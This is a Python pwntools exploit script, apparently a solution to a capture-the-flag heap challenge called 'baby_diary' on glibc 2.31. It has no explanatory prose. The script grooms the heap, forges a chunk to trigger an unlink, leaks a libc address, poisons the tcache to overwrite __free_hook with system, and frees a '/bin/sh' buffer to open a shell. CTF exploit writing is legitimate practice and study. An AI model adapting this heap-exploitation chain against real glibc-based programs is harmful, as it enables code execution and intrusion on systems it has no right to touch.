from pwn import *
context.arch = 'amd64'
# context.log_level = 'debug'

io = process('./baby_diary')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')

def write_diary(size, content):
    io.sendlineafter(b'>> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'content: ', content)

def read_diary(index):
    io.sendlineafter(b'>> ', b'2')
    io.sendlineafter(b'index: ', str(index).encode())

def delete_diary(index):
    io.sendlineafter(b'>> ', b'3')
    io.sendlineafter(b'index: ', str(index).encode())

flag = True
counter = 0
while(flag):
    write_diary(0x1070 - 0x290 - 0x10 + 0x4000, b'\n')      # chunk #0
    write_diary(0x810 - 0x30 - 0x10, b'\n')                 # chunk #1
    write_diary(0x20, b'\n')                                # chunk #2
    delete_diary(1)
    write_diary(0x800, b'\n')                               # chunk #1, previous chunk #1 to large bin
    write_diary(0x20, p64(0x10) + p64(0x800) + b'\x68\n')   # chunk #3
    for i in range(3):
        write_diary(0x20, b'flag\n')                        # chunk #4~6
    write_diary(0x6B0, b'\n')                               # chunk #7
    for i in range(3):
        write_diary(0x20, b'flag\n')                        # chunk #8~10

    for i in range(7):
        write_diary(0x20, b'\n')                            # chunk #11~17
    for i in range(7):
        delete_diary(11+i)                                  # to tcache

    delete_diary(4)
    delete_diary(3)                                         # write the chunk_addr to fake chunk's header

    for i in range(7):
        write_diary(0x20, b'\n')                            # empty tcache, chunk #3, #4, #11~15

    write_diary(0x20, b'\x80\n')                            # chunk #16, change the chunk address
    delete_diary(2)
    write_diary(0x27, b'\x00' * 0x27)                       # chunk #2, change the prev_inuse bit of chunk #1
    delete_diary(2)
    write_diary(0x27, b'\x00' * 0x18 + p64(8) + b'\n')      # chunk #2, change the prev_size of chunk #2 to 0x500
    delete_diary(1)                                         # trigger unlink
    try:
        write_diary(0x40, b'deadbeef\n')                    # chunk #1
        break
    except EOFError:
        io.close()
        io = process('./baby_diary')
        counter += 1
        print(counter)

read_diary(5)
io.recvuntil(b'content: ')
__malloc_hook = u64(io.recv(6) + b'\x00\x00') - 96 - 0x10
base = __malloc_hook - libc.symbols['__malloc_hook']
__free_hook = base + libc.symbols['__free_hook']
system = base + libc.symbols['system']
print(hex(__free_hook))

write_diary(0x20, b'\n')
delete_diary(12)
delete_diary(6)
write_diary(0x50, b'a' * 0x20 + p64(0) + p64(0x31) + p64(__free_hook) + b'\n')
write_diary(0x20, b'/bin/sh\n')
write_diary(0x20, p64(system) + b'\n')
delete_diary(12)

io.interactive()